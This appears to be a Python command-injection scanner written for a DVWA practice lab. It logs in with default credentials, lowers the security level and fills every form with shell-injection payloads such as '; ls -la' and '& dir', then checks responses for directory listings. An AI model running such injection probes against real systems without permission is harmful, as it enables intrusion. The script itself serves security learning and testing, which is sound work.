import re
import urllib.parse as urlparse

import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

from decode_handler import decode_values


class Scanner:
    def __init__(self, url: str, links: list[str], test_payloads: list[str], payload_success: list[str]):
        init()
        self.session = requests.Session()
        self.target_url = url
        self.target_links = links
        self.payloads = test_payloads
        self.answer_payload_success = payload_success
        self.target_forms_command_exec = []

    def login(self, login_form, data_login):
        self.session.post(login_form, data=data_login)

    def set_security_level(self, url, data_level):
        response = self.session.post(url, data=data_level)
        answer = decode_values(response.content)
        pattern = r"<b>Security Level:</b> (.*?)<br />"
        matches = re.findall(pattern, answer, re.DOTALL)
        return matches

    def extract_forms(self, url: str):
        """This function is used to extract all the forms from a webpage specified by the input URL."""
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, features='lxml')  # features='html.parser' features='lxml'
        return parsed_html.findAll("form")

    def submit_form(self, form, value: dict | str, url: str):
        """
        Extract all required attributes from forms. Fill out and submit the form
        :param form: Specify the form you want to submit
        :param value: The value we want to set for the inputs in this form
        :param url: Url address of the page from which we retrieved this form
        :return:
        """

        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")

        inputs_list = form.findAll("input")

        post_data = {}
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value

        if method == 'post':
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        """Check each link in the target_links list, extract forms from those links.
         Check forms and links for vulnerabilities"""
        for link in self.target_links:
            forms = self.extract_forms(link)
            # print(forms)

            for form in forms:
                """Add and call a method if a FORM vulnerability is found"""
                print(f"[+] Testing form in: {link}")

                is_vulnerable_to_command_exec = self.test_command_execution_in_form(form=form, url=link)

                if is_vulnerable_to_command_exec:
                    self.target_forms_command_exec.append((link, form))

                    print(f"\n{Fore.CYAN}[***] ðŸ’‰ Discovered in: {link}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[***] ðŸ’‰ Payload: \n\"{is_vulnerable_to_command_exec}\"{Style.RESET_ALL}\n")
                    print(f"{Fore.GREEN}Form: {Style.RESET_ALL} \n{form}")
                    print("=" * 50)

    def test_command_execution_in_form(self, form, url: str):

        results = []
        for answer in self.answer_payload_success:
            for payload in self.payloads:

                response = self.submit_form(form=form, value=payload, url=url)
                if answer in response.text:
                    results.append((True, payload))

                escaped_payload = payload.replace(" ", "%20")
                response = self.submit_form(form=form, value=escaped_payload, url=url)
                if answer in response.text:
                    results.append((True, escaped_payload))

        return [result for result in results if result[0]]


if __name__ == '__main__':
    target_url = "http://10.0.2.12/dvwa/"
    login_url = f"{target_url}/login.php"
    security_url = f"{target_url}/security.php"

    target_links = ["http://10.0.2.12/dvwa/vulnerabilities/exec/"]
    payloads = (
        # Bash / SH
        "; ls -la",
        "& ls -la",
        "&& ls -la",
        "| ls -la",
        "|| ls -la",
        # CSH
        "; ls -la",
        "& ls -la",
        "| ls -la",
        # Windows
        "& dir",
    )
    answer_payload_success = {"total", "root", "Directory of"}

    authorization_in_login_form = {
        "username": 'admin',
        "password": 'password',
        "Login": 'submit',
    }

    data_security = {
        'security': 'low',
        'seclev_submit': 'Submit'
    }

    vulnerability_scanner = Scanner(target_url, target_links, payloads, answer_payload_success)
    vulnerability_scanner.login(login_url, authorization_in_login_form)

    security_level = vulnerability_scanner.set_security_level(security_url, data_security)
    print(f"\n[+] Security Level: {security_level[0]} \n")

    print("\033[1;32m\nVulnerability Scanner Starts ðŸ§ ==> \033[0m")
    vulnerability_scanner.run_scanner()
